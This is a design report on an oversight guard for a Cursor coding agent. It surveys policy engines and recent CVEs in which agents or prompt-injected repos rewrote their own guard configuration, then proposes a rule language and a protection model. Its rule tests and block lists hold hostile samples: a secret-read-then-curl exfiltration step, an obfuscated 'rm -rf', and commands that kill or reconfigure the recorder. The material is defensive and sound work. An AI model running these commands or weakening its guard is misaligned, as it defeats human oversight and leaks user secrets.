# AgentFly: Configurable, Natural-Language Rules for a Cursor Agent Guard Without Letting the Agent Weaken Them

**Bottom line:** Write AgentFly rules in a small, deterministic, YAML-based sequence-rule language that works like a mix of Falco and Invariant. Use an LLM only offline, to turn the user's text into a draft rule; it must never make live allow/deny decisions. Every draft is checked against a schema, backtested on recorded Neo4j sessions and approved by a human through a channel the agent can't reach. Then move every piece of the guard (hooks.json, the hook script, the rules and the recorder) out of the workspace and out of the agent's OS user, because the 2025–2026 CVE record shows that coding agents writing their own config is the main way guards get bypassed.

## TL;DR
- **How others do it (fact):** Every mature tool keeps a deny > ask > allow precedence and a layered config, with admin or managed layers that lower layers can't override. These include Claude Code, Cursor hooks, the Gemini CLI policy engine and Cedar. Only flow-aware engines (Invariant Guardrails and research systems such as ConLeash and AgentFlow) express "after X, block Y". Natural-language-to-policy products, such as AWS Bedrock Automated Reasoning, and papers (Progent, AutoCedar, Cedar autoformalization) all compile text into a formal artifact, then validate and test it, and keep a human or a verifier in the loop.
- **Main threat (fact):** Many 2025–2026 CVEs follow one pattern: the agent, or a repo it opened, writes a config file that loosens its own guard. Examples:
  - Copilot `chat.tools.autoApprove`, CVE-2025-53773\[1\]
  - Cursor `.cursor/mcp.json`, CVE-2025-54135\[2\]
  - Cursor `.cursorignore`, CVE-2025-64110\[3\] (NVD: in 1.7.23 and below "a malicious model, could create a new cursorignore file which can invalidate the configuration of pre-existing ones"; fixed in 2.0)
  - Cursor git hooks, CVE-2026-26268\[4\] (NVD: "Sandbox escape via writing .git configuration was possible in versions prior to 2.5… No user interaction was required.")
  - Claude-style hook files read by Cursor, CVE-2026-48124\[5\]
  - Claude Code `settings.json` in the sandbox, CVE-2026-25725\[6\]
  - Claude Code `bypassPermissions` in repo settings, CVE-2026-33068\[7\]
- **What to build (opinion):** A rule format with `match`, an optional `after` (session taint) and `severity: block|warn|highlight`, plus inline test cases. A seven-step natural-language pipeline: compile → validate → explain → backtest → approve out-of-band → shadow → activate. A protection model with no agent-writable guard files, `failClosed: true` hooks installed at user or enterprise scope, a recorder running under a separate OS user, a signed ruleset and a "rules can only tighten without approval" invariant.

---

## Facts (with citations: URL + date)

*Note on dates: many vendor docs pages don't show a publication date. These are marked "undated docs page, retrieved 2026-10-14". Items older than 12 months are marked **[>12 mo]**.*

### 1. How existing guards express rules

| Tool | File / format | Decision tiers | Session / sequence awareness | Source |
|---|---|---|---|---|
| **Claude Code permissions** | `settings.json` → `permissions.allow / ask / deny` arrays with rule strings such as `Bash(git push *)`, `Read(./config/credentials.json)`. Managed settings sit at OS system paths.\[8\] | Deny is checked first, then ask, then allow. "The first match decides regardless of how specific each rule is."\[8\] | None; rules are stateless pattern rules. | https://code.claude.com/docs/en/settings-reference (undated docs page, retrieved 2026-10-14) |
| **Claude Code managed settings** | `managed-settings.json` (server-managed > MDM > file). `allowManagedPermissionRulesOnly` makes managed settings "the only settings source of permission rules".\[8\]\[9\] | Same as above | — | Same page as above |
| **Claude Code hooks** | `PreToolUse` returns `hookSpecificOutput.permissionDecision` = allow / deny / ask / defer. Exit code 2 blocks. A `ConfigChange` event fires "when a configuration file changes during a session" and "can block configuration changes from taking effect".\[10\] | allow / deny / ask / defer | Only through your own hook code | https://code.claude.com/docs/en/hooks (undated docs page, retrieved 2026-10-14) |
| **Claude Code hook exit codes** | "exit 1 — the conventional Unix failure code — blocks nothing" (third-party summary of the docs)\[11\] | — | — | https://blakecrosley.com/blog/claude-code-hooks-explained (date not shown) |
| **Cursor hooks** | `hooks.json` with `{"version":1,"hooks":{...}}`, per event (`beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `preToolUse`, `afterFileEdit`, …). Per-hook options: `command`, `type` (command \| prompt), `timeout`, `matcher` (a regex), `failClosed`.\[12\] | `permission`: allow / deny / ask. Exit 2 = deny. "Other exit codes – Hook failed, action proceeds (fail-open by default)". `failClosed: true` makes crashes, timeouts and missing output block. Invalid JSON from permission hooks blocks.\[12\] | None built in. Hooks receive `conversation_id` and `generation_id`, so state has to live in your own process (AgentFly's recorder). | https://cursor.com/docs/hooks (undated docs page, retrieved 2026-10-14) |
| **Cursor hook layering** | Enterprise (`/Library/Application Support/Cursor/hooks.json`, `/etc/cursor/hooks.json`, `C:\ProgramData\Cursor\hooks.json`) → Team → Project (`.cursor/hooks.json`) → User (`~/.cursor/hooks.json`). "Any `deny` wins over `ask`, and `ask` wins over `allow`, regardless of source." "Cursor watches hooks config files and reloads them automatically."\[12\] | — | — | https://cursor.com/docs/hooks (undated, retrieved 2026-10-14) |
| **Cursor prompt hooks** | `type: "prompt"`: an LLM judges a natural-language condition and returns `{ ok, reason }`\[12\] | ok / not ok | Not documented | https://cursor.com/docs/hooks (undated, retrieved 2026-10-14) |
| **Cursor allowlist / sandbox** | Run modes plus a sandbox with protected paths (`.git/config`, `.git/hooks`, `.vscode`, `.cursorignore`, "sensitive Cursor config files"). Also File-Deletion and External-File protection. "Auto-review is not a security boundary." The sandbox covers terminal commands only.\[13\] | — | — | https://cursor.com/docs/agent/security/run-modes (undated; changelog runs to v3.23, Oct 1, 2026) |
| **Cursor allowlist caveat** | Cursor's own guidance, as quoted by the researcher: "The allowlist is best-effort — bypasses are possible."\[14\] | — | — | https://danusminimus.github.io/posts/The-Agent-Security-Paradox-When-Trusted-Commands-In-Cursor-Become-Attack-Vectors/ (Jan 2026) |
| **Gemini CLI policy engine** | TOML `[[rule]]` blocks with `toolName`, `commandPrefix`, `commandRegex`, `mcpName`, `decision`, `priority`, `modes`. Tiers: Default 1.x, Extension 2.x, Workspace 3.x, User 4.x, Admin 5.x.\[15\]\[16\] | allow / deny / ask_user. "Higher numbers win."\[16\] | None | https://geminicli.com/docs/reference/policy-engine/ (undated); https://github.com/google-gemini/gemini-cli/blob/main/packages/core/src/policy/policies/yolo.toml (repo, retrieved 2026-10-14) |
| **Gemini CLI admin protection** | The admin policy dir (e.g. `/etc/gemini-cli/policies/`) "Must be owned by 'root'" (third-party write-up).\[17\] In headless mode the CLI removes the `ask_user` tool "so that it can never be allowed via a high-priority policy rule when no human is present."\[18\] | — | — | https://aipositive.substack.com/p/secure-gemini-cli-with-the-policy (date not shown); https://dev.to/agentrq/gemini-cli-yolo-mode-read-from-the-source-why-settingsjson-cant-turn-it-on (date not shown) |
| **OPA / Rego** | Signed bundles carry a `.signatures.json` that "dictates which files should be included in the bundle, what their SHA hashes are". Verification keys are configured out-of-band. Discovery signing keys "CANNOT be modified via discovery".\[19\]\[20\]\[21\] | Policy-defined | Only through supplied input/data | https://www.openpolicyagent.org/docs/management-bundles (undated); https://www.openpolicyagent.org/docs/management-discovery (undated) |
| **Cedar** | `permit` / `forbid` with scope plus `when` / `unless`. Policies are validated against a schema. A symbolic compiler emits SMT, "a response of UNSAT guarantees that the policy sets are equivalent."\[22\]\[23\] | Default deny; forbid overrides permit\[24\]\[25\] | None (stateless authorization) | https://arxiv.org/pdf/2407.01688 (2024) **[>12 mo]** |
| **Semgrep rules** | YAML with `id`, `pattern(s)`, `message`, `languages`, `severity`, `metadata`. Has a `mode: taint` with sources and sinks.\[26\] | `severity` is LOW / MEDIUM / HIGH / CRITICAL. "The older levels ERROR, WARNING, and INFO match HIGH, MEDIUM, and LOW."\[27\] | Taint mode (within code, not across sessions) | https://docs.semgrep.dev/writing-rules/rule-syntax (undated, retrieved 2026-10-14) |
| **Semgrep testing** | Test files annotated with `# ruleid:` (should match) and `# ok:` (should not), run with `semgrep --test`. The Semgrep Editor asks for at least one true positive and one true negative.\[28\]\[29\]\[30\] | — | — | https://semgrep.dev/docs/semgrep-code/editor (undated); https://dev.to/rahulxsingh/how-to-write-custom-semgrep-rules-complete-tutorial-49o2 (date not shown) |
| **Falco** | YAML `rule` / `desc` / `condition` / `output` / `priority` / `tags` / `exceptions`, plus reusable `macro` and `list`. An `override` section appends to or replaces upstream rules.\[31\]\[32\]\[33\] | `priority`: emergency, alert, critical, error, warning, notice, informational, debug. Falco says priority is about severity, not evaluation order.\[32\]\[33\] | Event-by-event (stateless conditions) | https://falco.org/docs/concepts/rules/basic-elements/ (undated); https://falco.org/docs/concepts/rules/overriding/ (undated) |
| **Invariant Guardrails** | Python-like `raise "msg" if:` rules. A flow operator `(a: ToolCall) -> (b: ToolCall)` matches "if-this-then-that" sequences. Also `count(min, max)` for loops and detectors (`secrets`, `pii`, `prompt_injection`). Enforced by Invariant Gateway, an MCP / LLM proxy. Can run locally via `LocalPolicy`.\[34\]\[35\]\[36\] | raise (block) | **Yes**: data-flow and sequence rules | https://github.com/invariantlabs-ai/invariant (repo, retrieved 2026-10-14); https://explorer.invariantlabs.ai/docs/guardrails/rules/ (undated) |
| **ConLeash (research)** | Policies over "flow summaries" (source → sink) with taint propagation, e.g. "allow reading from local but deny writing to extnet".\[37\] | ALLOW / DENY | Yes (taint) | https://arxiv.org/pdf/2605.11360 (May 2026) |
| **AgentFlow (research)** | "A policy language and runtime monitor for controlling how data moves through tool-using LLM agents," with bounded SMT checks\[38\] | — | Yes (flow) | https://arxiv.org/pdf/2608.22868 (Aug 2026) |

**Not found:** primary documentation for GitHub Copilot's agent firewall rule format, Codex CLI sandbox policy syntax, Docker MCP Gateway policy syntax, Lasso, Pangea and Microsoft MCP gateway rule formats, and Llama Guard custom-category syntax. I did not research these with primary sources in this pass.

**Known weaknesses of pattern matching (fact):**
- Cursor before 2.3 let shell built-ins bypass the auto-run allowlist. NVD's record for CVE-2026-22708 (CNA GitHub, CVSS 7.2 HIGH) says "certain shell built-ins can still be executed without appearing in the allowlist", letting an attacker "poison the shell environment by setting, modifying, or removing environment variables". It was published 2026-01-14 and reported 2025-08-11. https://nvd.nist.gov/vuln/detail/CVE-2026-22708 (Jan 14, 2026); https://danusminimus.github.io/posts/The-Agent-Security-Paradox-When-Trusted-Commands-In-Cursor-Become-Attack-Vectors/ (Jan 2026)
- NVD's record for CVE-2025-54131 says: "In versions below 1.3, an attacker can bypass the allow list in auto-run mode with a backtick (`) or $(cmd)." https://nvd.nist.gov/vuln/detail/CVE-2025-54131 (2025) **[>12 mo]**
- AgentTrust (May 2026) notes that textual guardrails "are easily defeated by trivial obfuscation (`r=rm; $r -rf /`) and … cannot reason about sequences of actions."\[39\] https://arxiv.org/html/2605.04785v1 (May 2026)
- Claude Code deny rules could be bypassed through symlinks before 2.1.7 (CVE-2026-25724).\[40\] https://github.com/advisories/ghsa-4q92-rfm6-2cqx (Feb 6, 2026)

### 2. Natural-language-to-policy features

| System | Compile step | Preview | Test / backtest | Approval | Source |
|---|---|---|---|---|---|
| **AWS Bedrock Automated Reasoning checks** | A source document is turned into rules, variables and custom types in formal logic\[41\] | Console shows the extracted "Definitions" plus a fidelity report | Natural-language test Q&A generation (Nov 2025). Iterative refinement "letting the system deduce the changes needed for the policy to pass those tests" plus an ambiguity-reduction workflow (Jun 2026). Findings include TRANSLATION_AMBIGUOUS.\[42\]\[43\]\[44\] | Human refines and annotates; no formal approval gate documented | https://docs.aws.amazon.com/bedrock/latest/userguide/automated-reasoning-checks-concepts.html (undated); https://aws.amazon.com/about-aws/whats-new/2025/11/automated-reasoning-checks-include-natural-language/ (Nov 2025); https://aws.amazon.com/about-aws/whats-new/2026/06/amazon-bedrock-guardrails/ (Jun 2026) |
| — limits stated by AWS | "Will not protect against prompt injection attacks." For checks such as password rules AWS says deterministic code is "better handled". The "up to 99% verification accuracy" figure is AWS's own marketing claim.\[41\]\[45\]\[46\] | | | | https://docs.aws.amazon.com/bedrock/latest/userguide/guardrails-automated-reasoning-checks.html (undated) |
| **OpenAI gpt-oss-safeguard** | No compilation: the written policy is read at inference time ("bring your own policy")\[47\]\[48\] | Reasoning output exposed | Policy A/B testing suggested\[48\] | None built in | https://openai.com/index/introducing-gpt-oss-safeguard/ (research preview; date not shown in retrieved text); https://developers.openai.com/cookbook/articles/gpt-oss-safeguard-guide (undated) |
| **PolicyGuard (research)** | A natural-language policy file is used as the system prompt for gpt-oss-safeguard-20b. Classifies coding-agent prompts as ALLOW / BLOCK / REVIEW.\[49\] | — | Frozen 927-prompt test set; compared against a JSON-rubric format\[49\] | — | https://arxiv.org/pdf/2608.02687 (Aug 2026) |
| **Cursor prompt hooks** | No compilation; an LLM evaluates the text at runtime\[12\] | — | — | — | https://cursor.com/docs/hooks (undated) |
| **Progent (research)** | An LLM generates a least-privilege policy in a DSL from the user task and updates it during execution\[50\]\[51\] | — | AgentDojo attack success rate cut from 41.2% to 2.2% (manual + LLM policies). An SMT check separates privilege narrowing from expansion.\[52\]\[53\] | "Approver module": Disable-Update / Auto-Deny / Auto-Approve modes for policy expansions\[54\] | https://arxiv.org/pdf/2504.11703 (Apr 2025) **[>12 mo]**; https://ai-papers-reader.taodong.net/2025-04-25/2504.11703/ (Apr 2025) |
| **Cedar autoformalization (Mondl et al.)** | An LLM generator–critic loop turns agent prompts, MCP tool descriptions and policy documents into Cedar\[55\] | — | Static analysis detects contradictions "before the policies are ever deployed" (MedAgentBench)\[55\] | — | https://www.alphaxiv.org/abs/2606.26649 (Jun 25, 2026) |
| **AutoCedar** | Agentic synthesis against reviewed schemas and "boundary plans"\[22\] | — | `cedar symcc` compares permit sets via SMT "rather than over a finite test suite"\[56\] | Reviewed schema / boundary as the human input\[56\] | https://arxiv.org/html/2607.03656 (Jul 2026) |
| **RAISE** | RL-trained LLM Cedar synthesis using symbolic evaluation as the reward\[22\] | — | Symbolic verification\[22\] | — | https://arxiv.org/html/2609.33796v1 (Sep 2026) |
| **Semgrep** | An MCP prompt `write_custom_semgrep_rule` helps AI assistants draft rules\[57\] | Semgrep Editor | `semgrep --test` with true and false positives\[29\]\[30\] | — | https://github.com/semgrep/semgrep (repo, retrieved 2026-10-14) |

**Not found:** primary documentation for natural-language rule generation in AWS Verified Permissions / Cedar, Permit.io, Styra / OPA AI authoring, Falco / Sysdig AI rule writing, Cloudflare / Zscaler, or Lakera natural-language policies. I also found no primary source on Claude Code or Cursor writing permission rules from a prompt. AgentSpec, ShieldAgent, GuardAgent, Conseca and CaMeL were not checked against primary sources in this pass.

### 3. Self-modifying policy: incidents and defenses

**Incidents and CVEs (fact):**

| Date | ID | What the agent / repo could rewrite | Fix | Source |
|---|---|---|---|---|
| Aug 2025 (Patch Tuesday) **[>12 mo]** | CVE-2025-53773 (GitHub Copilot / VS Code) | Prompt injection made Copilot add `"chat.tools.autoApprove": true` to `.vscode/settings.json` ("YOLO mode"), then run commands\[1\]\[58\] | Aug 2025 patch\[59\] | https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/ (Aug 2025); https://cybersecuritynews.com/github-copilot-rce-vulnerability/ (Aug 14, 2025) |
| Jul 2025 **[>12 mo]** | CVE-2025-54135 "CurXecute" (Cursor) | "If the file is a dotfile, editing it requires approval but creating one if it doesn't exists doesn't." The agent could create `.cursor/mcp.json` and get RCE.\[2\] | "The agent has been blocked from writing MCP-sensitive files without approval"; advisory says ≤1.2.1 affected, fixed 1.3.9 (Aim/Cato say 1.3, a discrepancy)\[2\]\[60\]\[61\] | https://github.com/cursor/cursor/security/advisories/GHSA-4cxx-hrm3-49rm (Aug 2, 2025) |
| Aug 2025 **[>12 mo]** | CVE-2025-54136 "MCPoison" (Cursor) | An already-approved MCP config could be swapped "without triggering any warning or re-prompt"\[62\] | Fixed in 1.3 (re-approval on change)\[62\]\[63\] | https://nvd.nist.gov/vuln/detail/CVE-2025-54136 (Aug 2025) |
| Jul 2025 **[>12 mo]** | CVE-2025-8217 / AWS-2025-015 (Amazon Q Developer for VS Code)\[64\]\[65\] | A supply-chain PR planted a wiper prompt into v1.84.0, which shipped Jul 17, 2025. AWS says it failed "due to a syntax error".\[65\]\[66\]\[67\] | v1.85.0\[65\]\[68\] | https://www.bleepingcomputer.com/news/security/amazon-ai-coding-agent-hacked-to-inject-data-wiping-commands/ (Jul 25, 2025) |
| Fixed in Cursor 1.7 (NVD record) | CVE-2025-59944 (Cursor) | NVD: "Versions 1.6.23 and below contain case-sensitive checks" on protected paths "(e.g., */.cursor/mcp.json)", so the agent could overwrite them on case-insensitive filesystems | Cursor 1.7 | https://nvd.nist.gov/vuln/detail/CVE-2025-59944; https://www.lakera.ai/blog/cursor-vulnerability-cve-2025-59944 (date not shown) |
| Nov 2025 | GHSA-2jr2-8wf5-v6pf, GHSA-6r98-6qcw-rxrw (Cursor) | Sensitive-file protection bypass via Windows backslashes and NTFS path quirks\[69\] | — | Cursor advisory index https://github.com/cursor/cursor/security/advisories (Nov 3, 2025; via subagent) |
| ≤1.7.23 → fixed 2.0 | CVE-2025-64110 (Cursor) | NVD: in 1.7.23 and below "a malicious model, could create a new cursorignore file which can invalidate the configuration of pre-existing ones", letting the agent read protected files | "The agents ability to create and edit cursorignore files has been blocked in all cases."\[3\] | https://nvd.nist.gov/vuln/detail/CVE-2025-64110; https://github.com/cursor/cursor/security/advisories/GHSA-vhc2-fjv4-wqch (date not shown) |
| Jan 14, 2026 | CVE-2026-22708 (Cursor) | NVD: "certain shell built-ins can still be executed without appearing in the allowlist" (environment poisoning) | 2.3 | https://nvd.nist.gov/vuln/detail/CVE-2026-22708 (Jan 14, 2026) |
| Feb 6, 2026 | CVE-2026-25725 (Claude Code) | The bubblewrap sandbox "failed to properly protect the .claude/settings.json configuration file when it did not exist at startup". Code in the sandbox could create it and "inject persistent hooks".\[6\] | 2.1.2\[6\] | https://nvd.nist.gov/vuln/detail/CVE-2026-25725 (Feb 6, 2026) |
| Feb 13, 2026 | CVE-2026-26268 (Cursor) | NVD: "Sandbox escape via writing .git configuration was possible in versions prior to 2.5…\[4\] may cause out-of-sandbox RCE… No user interaction was required." | 2.5 | https://nvd.nist.gov/vuln/detail/CVE-2026-26268 (Feb 13, 2026); GHSA-8pcm-8jpx-hv8r (Feb 13, 2026, via subagent) |
| Mar 19, 2026 | CVE-2026-33068 (Claude Code) | A repo-controlled `.claude/settings.json` setting `permissions.defaultMode: bypassPermissions` was applied before the trust dialog\[70\] | 2.1.53\[70\] | https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-33068/ (Mar 19, 2026) |
| date not shown | CVE-2026-40068 (Claude Code) | NVD: "In versions 2.1.63 through 2.1.83 of Claude Code, the folder trust determination logic used the git worktree commondir file without validating its contents", letting repo hooks in `.claude/settings.json` run without the trust dialog | 2.1.84\[71\] | https://nvd.nist.gov/vuln/detail/CVE-2026-40068 (date not shown) |
| May 21, 2026 | CVE-2026-48124 / GHSA-pc9j-3qc2-95wv (Cursor) | Cursor ran workspace-defined Claude hooks from `.claude/settings.local.json` "without dedicated user approval. A malicious workspace or agent-created file could configure hooks…"\[5\] | 3.0.0\[5\] | https://nvd.nist.gov/vuln/detail/CVE-2026-48124 (May 2026) |
| Aug 11, 2026 disclosure | CVE-2026-35603 (Claude Code; Cursor reported as still affected) | Machine-wide config in world-writable `C:\ProgramData\` let any local user plant hooks (`C:\ProgramData\Cursor\hooks.json`)\[72\] | Claude Code moved managed settings to a write-protected location. Cursor: "no formal reply … still reproducible" as of Aug 11, 2026 (secondhand, single source).\[72\] | https://dev.to/c_k_fb750e731394/cve-2026-35603-cursor-still-trusts-a-world-writable-folder-34p9 (Aug 2026) |

**Defenses documented by vendors (fact):**
- **Claude Code sandbox protected paths:** "the sandbox still denies writes to the files Claude Code loads configuration and code from. A command that could edit those files could grant itself permissions, or add a hook or MCP server that Claude Code runs outside the sandbox." The list covers `.claude` settings, hooks, skills, agents and commands, and `.mcp.json`. "The sandbox covers shell commands only. Claude's file tools, MCP servers, and hooks run outside it."\[73\] Source: https://code.claude.com/docs/en/sandboxing (undated, retrieved 2026-10-14). `permissions.allow` rules "do not pre-approve protected-path writes".\[74\] Source: https://code.claude.com/docs/en/permission-modes (undated).
- **Claude Code managed tier:** a managed settings deny can't be overridden, and `allowManagedPermissionRulesOnly` locks out lower scopes\[8\]\[75\] (https://code.claude.com/docs/en/settings-reference, undated). A `ConfigChange` hook can block configuration changes "except policy_settings"\[11\] (https://blakecrosley.com/blog/claude-code-hooks-explained, date not shown).
- **Cursor:** "Team-admin policies and Cursor's hardcoded security rules layer on top, so local files cannot weaken those protections"\[13\] (https://cursor.com/docs/agent/security/run-modes, undated). Enterprise hooks live in OS system paths, and deny wins across all sources\[12\] (https://cursor.com/docs/hooks, undated). **Not found:** an official Cursor statement that explicitly lists `.cursor/hooks.json` as an agent-protected file. The docs only say "sensitive Cursor config files".
- **OPA:** bundle signing with out-of-band keys; discovery keys can't be changed via discovery (https://www.openpolicyagent.org/docs/management-discovery, undated).\[20\]\[21\]
- **Progent:** an SMT "expansion check prevents any silent privilege escalation" when an LLM-proposed policy update is manipulated (https://arxiv.org/pdf/2504.11703, Apr 2025 **[>12 mo]**).\[54\]

**Not found:** any public incident where an agent specifically edited a *third-party guard's* rules file, such as an AgentFly-like recorder. The closest analogues are the config-rewrite CVEs above.

---

## Opinions / Recommendations

### A. Threat model specific to AgentFly today (opinion, based on the facts above)
1. **The guard is inside the blast radius.** AgentFly "only works inside its own cloned repo", so `.cursor/hooks.json`, the Python hook script and any rules file are workspace files. Cursor lets agents write workspace files, and it "watches hooks config files and reloads them automatically".\[12\]\[76\] One agent edit could therefore remove the hook, change the recorder URL or rewrite R1. This is the CurXecute / CVE-2025-64110 / CVE-2026-48124 pattern.
2. **Fail-open default.** Cursor hooks fail open on crashes and non-0/2 exit codes unless `failClosed: true` is set.\[12\] If the recorder is down, or the agent kills it (`pkill uvicorn`), every action proceeds.
3. **The recorder API is reachable by the agent.** It listens on `127.0.0.1:8787`, and the watched agent can run `curl 127.0.0.1:8787/...` from its own shell. Any rule-editing or approval endpoint on that port is therefore agent-reachable.
4. **R1 is a regex over command strings.** Cursor's own allowlist history shows this is bypassable with built-ins, `$(...)`, aliases, `python -c` or `node -e`.

### B. Proposed rule format: `agentfly-rules/v1` (YAML)

Design choices, each borrowed from a cited system:
- Falco-style reusable `lists` / `macros`.\[32\]
- Invariant / ConLeash-style `after:` taint for sequences.
- Cedar / Claude Code-style "block beats warn beats highlight; most restrictive wins".
- Semgrep-style inline `tests`.\[28\]
- Gemini- and Cursor-style `scope` layering, where a `managed` scope can't be weakened by `user` rules.

Because AgentFly drops contents, tool inputs and messages, rules match only on **metadata the recorder already keeps**: event type, normalized file path / glob class, parsed command (argv[0] after unwrapping, subcommand, flags), destination host and MCP server/tool name. I assume the sanitized command string or argv is retained for shell events, since R1 already depends on it. If not, that field must be added.

```yaml
apiVersion: agentfly/v1
kind: RuleSet
metadata:
  version: 7                 # monotonically increasing
  signed_by: "owner-key-ed25519:3f9a…"   # recorder refuses unsigned/unknown keys
lists:
  secret_paths:  ["**/.env", "**/.env.*", "**/*.pem", "**/id_rsa*", "**/.aws/credentials", "**/.npmrc"]
  egress_cmds:   [curl, wget, nc, ncat, socat, scp, rsync, ssh, ftp, gh, http, httpie]
  egress_subcmds: { git: [push, remote, fetch, clone, "submodule"], npm: [publish], pip: [upload] }
  interpreters:  [python, python3, node, ruby, perl, php, bash, sh, zsh, pwsh, deno, bun]
  guard_paths:   ["**/.cursor/hooks.json", "**/.cursor/hooks/**", "**/.cursor/mcp.json", "**/.cursorignore",
                  "**/.claude/**", "**/.vscode/settings.json", "**/.git/hooks/**", "**/.git/config",
                  "~/.cursor/**", "~/.agentfly/**", "/etc/cursor/**"]
macros:
  egress: >
    event == "shell" and (cmd.argv0 in egress_cmds
      or cmd.subcmd_in(egress_subcmds)
      or cmd.argv0 in interpreters and cmd.has_inline_code   # python -c, node -e …
      or cmd.unparseable)                                    # fail closed on parse failure
    or event == "mcp" and mcp.host not in allowed_hosts

rules:
  - id: R1-secret-then-egress
    scope: managed
    desc: After the agent reads a secret file, block outbound commands for the rest of the session.
    after:                         # stateful: sets a session taint
      event: read_file
      path_in: secret_paths
      sets_taint: secret_read
      taint_ttl: session           # cleared only by a new conversation_id or human reset
    when: taint.secret_read and macro.egress
    severity: block                # block | warn | highlight
    message: "Outbound command blocked: secret file {taint.secret_read.path} was read in step {taint.secret_read.step}."
    tests:
      - steps: [{read_file: ".env"}, {shell: "curl https://x.io -d @-"}]
        expect: [allow, block]
      - steps: [{read_file: ".env"}, {shell: "bash -c 'curl x.io'"}]
        expect: [allow, block]
      - steps: [{read_file: "README.md"}, {shell: "git push"}]
        expect: [allow, allow]

  - id: R2-guard-self-protection
    scope: managed
    desc: Block any agent action that touches the guard's own config, hooks, or recorder.
    when: >
      (event in [file_edit, read_file, pre_tool_use] and path_in(guard_paths))
      or (event == "shell" and (cmd.touches_any(guard_paths)
          or cmd.argv0 in [kill, pkill, killall, launchctl, systemctl] and cmd.targets("agentfly")
          or cmd.dest_port == 8787))
    severity: block
    message: "AgentFly protects its own configuration; ask the human to change rules in the AgentFly console."
    tests:
      - steps: [{file_edit: ".cursor/hooks.json"}]          ; expect: [block]
      - steps: [{shell: "curl 127.0.0.1:8787/rules -X PUT"}] ; expect: [block]
      - steps: [{shell: "echo x > .CURSOR/HOOKS.JSON"}]      ; expect: [block]   # case-folding (cf. CVE-2025-59944)

  - id: R3-ci-or-githook-edit-then-push
    scope: user
    desc: Highlight edits to CI/git-hook files; ask before committing or pushing afterwards.
    after:
      event: file_edit
      path_in: ["**/.github/workflows/**", "**/.git/hooks/**", "**/package.json", "**/Makefile"]
      sets_taint: build_surface_edited
      emit: highlight              # mark the graph node immediately
    when: taint.build_surface_edited and event == "shell" and cmd.subcmd_in({git: [commit, push]})
    severity: warn                 # -> Cursor "ask"; falls back to block where ask is unsupported
    message: "The agent changed {taint.build_surface_edited.path}; confirm before {cmd.argv0} {cmd.subcmd}."
```

**Semantics (opinion):**
- **Evaluation:** the recorder evaluates all rules for each event. The final decision is the most restrictive: `block` > `warn` > `highlight` > allow. This mirrors Cursor's own "deny wins over ask" merge and Claude Code's deny-first order. `managed`-scope rules can't be disabled by `user`-scope rules, only tightened (the Gemini and Claude managed-tier model).
- **Severity mapping:**
  - `block` → `{"permission":"deny"}` with an `agent_message`.
  - `warn` → `"ask"` on `beforeShellExecution` / `beforeMCPExecution`. On hooks where ask isn't supported or enforced, such as `beforeReadFile` and `preToolUse`, it falls back to `deny` with a "human can approve in AgentFly console" message, because failing closed beats silently allowing.
  - `highlight` → `allow` plus a red node in the XYFlow graph and a `Rule` → `Step` edge in Neo4j.
- **Taint is the session graph.** `after:` writes a `(Session)-[:TAINTED {by: Step}]->(Taint)` fact, so the existing Neo4j schema already holds the state. Taint lasts for the whole `conversation_id`. Only a human reset in the console clears it, never the agent.
- **Command normalization** happens in the recorder, not in regex:
  - shlex-tokenize the command
  - split on `;`, `&&`, `|`, `$(…)` and backticks
  - unwrap `bash -c`, `sh -c`, `env`, `xargs`, `sudo`, `eval`, `source`
  - resolve aliases where possible
  - lowercase and canonicalize paths (case-fold, resolve symlinks and `..`, handle Windows backslashes, per CVE-2025-59944, CVE-2026-25724 and the NTFS advisories)
  - anything that fails to parse sets `cmd.unparseable = true`, and the egress macro treats it as a match.

### C. Natural-language flow, step by step (opinion)
1. **Author in the console, not in chat.** The user types, for example, "Once the agent has opened any credentials file, don't let it talk to the internet; just warn for git fetch." Input is accepted only from the AgentFly console UI, which runs under the recorder's OS user (see section D). Rule text proposed by the watched agent is never accepted.
2. **Compile with a constrained LLM.** An offline LLM call turns the text into `agentfly/v1` YAML. It uses JSON-schema-constrained output with a **closed vocabulary**: only the event types, fields, lists and macros that exist. This is the same idea as Bedrock's variables/types and AutoCedar's reviewed schema.\[22\]\[56\] The compiler must also return (a) a plain-English back-translation, (b) an explicit list of ambiguities ("Does 'credentials file' include `.npmrc`?") in the spirit of Bedrock's `TRANSLATION_AMBIGUOUS`, and (c) at least two positive and two negative test sequences, Semgrep-style.
3. **Validate deterministically:**
   - schema validation
   - unknown-field and unknown-list rejection
   - a lint pass that flags over-broad globs (`**`), empty lists and regexes that can't match
   - a **weakening check**: diff the candidate ruleset against the active one and classify each change as *tightening* or *loosening*. Loosening includes removed rules, lower severity, narrower `when`, shorter `taint_ttl` and new exceptions. This is the Progent "narrowing vs expansion" idea; for a small DSL, structural diff plus backtest is enough without SMT.\[52\]
4. **Preview:** show side by side: the user's text, the back-translation, the YAML diff (with loosening changes in red) and the open ambiguity questions. The user must answer or dismiss the ambiguities.
5. **Backtest on recorded history:** replay the last N sessions from Neo4j (Session → Step chains) through the candidate ruleset. Report every step whose decision would change: "would have blocked 3 steps in 2 sessions; here they are", with graph links. Also run the generated tests and the existing regression suite. Zero hits on a rule that is supposed to catch something counts as a warning sign.
6. **Human approval, out-of-band:** approval needs a secret the agent can't read, such as a local passphrase, an OS auth prompt, a WebAuthn / security key, or a signing key in the OS keychain owned by a different user. The console signs the new ruleset (version + 1). A loosening change needs a second confirmation and a typed reason.
7. **Shadow, then activate:** new rules run in `highlight`-only "shadow" mode for a set period or number of sessions. Their would-be decisions are logged to the graph. Then they are promoted to their declared severity. Every version is kept for one-click rollback. Rulesets can also be exported as a git-reviewable file for team GitOps, the OPA-bundle-style model.

### D. Protection model (opinion)
1. **Nothing the agent can write.** Install AgentFly's hooks at user scope (`~/.cursor/hooks.json`) or, better, enterprise scope (`/etc/cursor/hooks.json`, `/Library/Application Support/Cursor/hooks.json`). Make them root- or admin-owned and read-only to the developer user. Cursor merges all sources and deny wins, so a project-level hook can't override AgentFly's deny.\[12\] On Windows, don't rely on `C:\ProgramData\Cursor\` until its ACLs are verified, given the CVE-2026-35603 report. Delete the in-repo `.cursor/hooks.json` once installed.
2. **Separate process and separate OS user.** Run the recorder as a dedicated `agentfly` user (a launchd / systemd service). Store rules in `/var/lib/agentfly/` or `~agentfly/`, mode 0600. The developer's shell, and so the agent, can't read keys, edit rules or kill the service without sudo.
